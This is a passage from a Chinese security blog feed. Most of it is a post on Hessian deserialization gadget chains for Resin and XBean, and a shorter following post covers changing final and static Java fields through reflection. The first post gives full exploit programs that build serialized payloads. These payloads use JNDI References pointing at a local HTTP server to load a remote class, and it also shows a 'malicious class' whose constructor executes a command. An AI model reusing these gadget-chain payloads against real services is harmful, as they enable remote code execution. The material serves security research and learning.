class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(qName, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意类TestRef</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestRef</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TestRef</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102208703.png" alt="image-20241010220704531"></p><h2 id="xbean"><a href="#XBean" class="headerlink" title="XBean"></a>XBean</h2><p>这条链和Resin差不多</p><p>导入下面依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-naming<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>链子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#equals--&gt;XString#equals--&gt;ContextUtil.ReadOnlyBinding#toString--&gt;Binding#toString--&gt;ContextUtil.ReadOnlyBinding#getObject--&gt;ContextUtil#resolve--&gt;NamingManager#getObjectInstance<br></code></pre></td></tr></table></figure><p>看一下关键的地方</p><p>ContextUtil.ReadOnlyBinding#toString本身没有toString所以就走到父类Binding#toString</p><p><img src="https://cdn.clown2024.cn/202410102223585.png" alt="image-20241010222327507"></p><p>ContextUtil.ReadOnlyBinding#getObject</p><p><img src="https://cdn.clown2024.cn/202410102224965.png" alt="image-20241010222415889"></p><p>ContextUtil#resolve</p><p><img src="https://cdn.clown2024.cn/202410102227755.png" alt="image-20241010222504369"></p><p>然后后面的就和前面一样了</p><p>exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.ContextUtil;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.WritableContext;<br><br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XBeanUse</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">//创建ContextUtil.ReadOnlyBinding对象</span><br>        ContextUtil.<span class="hljs-type">ReadOnlyBinding</span> <span class="hljs-variable">readOnlyBinding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContextUtil</span>.ReadOnlyBinding(<span class="hljs-string">&quot;clown&quot;</span>,ref,<span class="hljs-keyword">new</span> <span class="hljs-title class_">WritableContext</span>());<span class="hljs-comment">//放入ref</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(readOnlyBinding.hashCode());<br>        <span class="hljs-comment">// 创建Xtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// 创建HashMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(readOnlyBinding, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102245522.png" alt="image-20241010224522400"></p><blockquote><p>选择Context的实现类的时候有些可能报错在执行他的getEnvironment方法的时候，需要设置一些变量之类的，这里的WritableContext类就可以直接创建就能用</p></blockquote><h2 id="其他链"><a href="#其他链" class="headerlink" title="其他链"></a>其他链</h2><p>还有一些其他的链子比如Spring AOP之类的就不分析了，懒了主要是（</p><p>看一下师傅的文章就好，到时遇到再研究。</p><p>这篇文章有相关exp：<a href="https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&u_asig=1a0c384b17285714178144818e003d">https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&amp;u_asig=1a0c384b17285714178144818e003d</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来学一下Hessian反序列化，主要参考su18师傅的文章：&lt;/p&gt;
&lt;h1 id=&quot;hessian简介&quot;&gt;&lt;a href=&quot;#Hessian简介&quot; class=&quot;headerlink&quot; title=&quot;Hessian简介&quot;&gt;&lt;/a&gt;Hessian简介&lt;/h1&gt;&lt;p&gt;直接抄s</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>反射修改变量</title>
    <link href="https://clowsman.github.io/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/"/>
    <id>https://clowsman.github.io/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/</id>
    <published>2024-10-04T03:25:10.000Z</published>
    <updated>2024-10-04T03:26:39.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="低版本修改final和static"><a href="#低版本修改final和static" class="headerlink" title="低版本修改final和static"></a>低版本修改final和static</h1><p>参考文章：<a href="https://www.cnblogs.com/noKing/p/9038234.html">https://www.cnblogs.com/noKing/p/9038234.html</a></p><h2 id="修改static变量"><a href="#修改static变量" class="headerlink" title="修改static变量"></a>修改static变量</h2><p>这里和正常修改普通变量一样都是没问题的</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//修改static变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;str&quot;</span>);<br>        str1.setAccessible(<span class="hljs-literal">true</span>);<br>        str1.set(test1,<span class="hljs-string">&quot;ceshi1&quot;</span>);<br>        System.out.println(Test1.str);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125754.png" alt="image-20241004100135810"></p><h2 id="修改final变量"><a href="#修改final变量" class="headerlink" title="修改final变量"></a>修改final变量</h2><p>这里有点不同</p><p>我们修改StringBuilder变量</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//修改final的变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name1.setAccessible(<span class="hljs-literal">true</span>);<br>        name1.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi3&quot;</span>));<br>        System.out.println(test1.name);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125725.png" alt="image-20241004100649459"></p><p>看到是可以修改成功的</p><p>但是如果我们修改String变量会发现修改不成功，这是因为String类型的final变量，在优化时会将其变成常量，比如下面的System.out.println(test1.STR1);就会变成System.out.println(“test”);，所以其实赋值是成功了的，但是因为打印变成常量了所以没变化，我们可以用反射拿出值来验证一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//修改final的String变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi2&quot;</span>);<br>        System.out.println(test1.STR1);<br>        System.out.println(str11.get(test1));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125750.png" alt="image-20241004100943421"></p><p>可以看到确实是没问题的</p><p>那我们想要修改final变量就需要防止String类型变量在编译时被处理为常量，方法就是让其值的初始化经过运算才能得到，我们代码可以改成这样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=(<span class="hljs-literal">null</span> == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;default4&quot;</span> : <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default5&quot;</span>).toString();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//修改final的String变量</span><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi5&quot;</span>);<br>        System.out.println(test1.STR1);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR2&quot;</span>);<br>        str2.setAccessible(<span class="hljs-literal">true</span>);<br>        str2.set(test1,<span class="hljs-string">&quot;ceshi6&quot;</span>);<br>        System.out.println(test1.STR2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125726.png" alt="image-20241004101525466"></p><p>这两种方法我们都可以防止其被常量化</p><h2 id="修改同时被final和static修饰的变量"><a href="#修改同时被final和static修饰的变量" class="headerlink" title="修改同时被final和static修饰的变量"></a>修改同时被final和static修饰的变量</h2><p>此时通过常规反射的写法就会报错，如果我们要修改的话就需要先去除final修饰符才行</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//反射同时修改static和final修饰的变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> name11.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<span class="hljs-comment">//获取modifiers字段</span><br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//去除final修饰符</span><br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//将final修饰符设置回来</span><br>        System.out.println(test1.name1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用modifiers字段去除final修饰符即可修改。</p><blockquote><p> <code>Field</code> 类中的 <code>modifiers</code> 字段。这个字段是一个 <code>int</code> 类型的值，表示该字段的修饰符（如 <code>public</code>、<code>private</code>、<code>final</code> 等），该字段是一个私有字段。</p><p><code>Modifier.FINAL</code> 是一个常量，表示 <code>final</code> 修饰符的位掩码。</p></blockquote><h1 id="高版本修改final和static"><a href="#高版本修改final和static" class="headerlink" title="高版本修改final和static"></a>高版本修改final和static</h1><p>其他的反射修改都没有变化，就是修改同时被final和static修饰的变量的方法从Java12开始失效了，我在java17测试是直接没有modifiers这个字段了。这是因为高版本下不能通过getDeclaredFiled获取Field的属性。</p><p>这一点可以从fieldFilterMap里面知道</p><p><img src="https://cdn.clown2024.cn/202410041125763.png" alt="image-20241004105355114"></p><p>图中被过滤的类都不能直接通过公共反射获取他们的属性了，我们的Field类就在其中。</p><p>那就需要改一改方法了，这种方法对java8-java17都是适用的，参考文章：<a href="https://blog.csdn.net/wu_weijie/article/details/129251045">https://blog.csdn.net/wu_weijie/article/details/129251045</a></p><p>我们可以改成用<strong>getDeclaredFields0</strong>方法来获取，从文章中可以知道他能返回一个Field数组对象，里面就包含了我们的modifiers属性</p><p>那我们的修改代码就可以改成下面这样：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> 